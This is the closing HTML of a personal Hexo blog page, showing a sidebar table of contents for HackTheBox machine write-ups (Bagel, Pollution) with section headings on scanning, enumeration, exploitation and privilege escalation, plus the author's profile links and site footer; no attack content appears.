href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-28"><span class="nav-number">29.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_bagel"><span class="nav-number">30.</span> <span class="nav-text"> HackTheBox_Bagel</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-13"><span class="nav-number">30.1.</span> <span class="nav-text"> 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-30"><span class="nav-number">30.1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B7%AF%E5%BE%84%E6%9E%9A%E4%B8%BE-9"><span class="nav-number">30.1.2.</span> <span class="nav-text"> 路径枚举</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-28"><span class="nav-number">30.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-29"><span class="nav-number">30.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#hackthebox_pollution"><span class="nav-number">31.</span> <span class="nav-text"> HackTheBox_Pollution</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-14"><span class="nav-number">31.1.</span> <span class="nav-text"> 信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F-31"><span class="nav-number">31.1.1.</span> <span class="nav-text"> 端口扫描</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vhost-4"><span class="nav-number">31.1.2.</span> <span class="nav-text"> VHOST</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-29"><span class="nav-number">31.2.</span> <span class="nav-text"> 漏洞利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-30"><span class="nav-number">31.3.</span> <span class="nav-text"> 权限提升</span></a></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">xXxYOLOxXx</p>
  <div class="site-description" itemprop="description">Explorer for unknown.</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">45</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">51</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/monster414" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;monster414" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:yolo-yolo@qq.com" title="E-Mail → mailto:yolo-yolo@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://music.163.com/#/user/home?id=302397927" title="CloudMisuc → https:&#x2F;&#x2F;music.163.com&#x2F;#&#x2F;user&#x2F;home?id&#x3D;302397927" rel="noopener" target="_blank"><i class=" fa-fw"></i>CloudMisuc</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://steamcommunity.com/id/Purple_Miracle/" title="Steam → https:&#x2F;&#x2F;steamcommunity.com&#x2F;id&#x2F;Purple_Miracle&#x2F;" rel="noopener" target="_blank"><i class=" fa-fw"></i>Steam</a>
      </span>
      <span class="links-of-author-item">
        <a href="https://yoloyolo.top/atom.xml" title="RSS → https:&#x2F;&#x2F;yoloyolo.top&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>RSS</a>
      </span>
  </div>
  <div class="cc-license motion-element" itemprop="license">
    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
  </div>



      </div>
        <div class="back-to-top motion-element">
          <i class="fa fa-arrow-up"></i>
          <span>0%</span>
        </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">xXxYOLOxXx</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
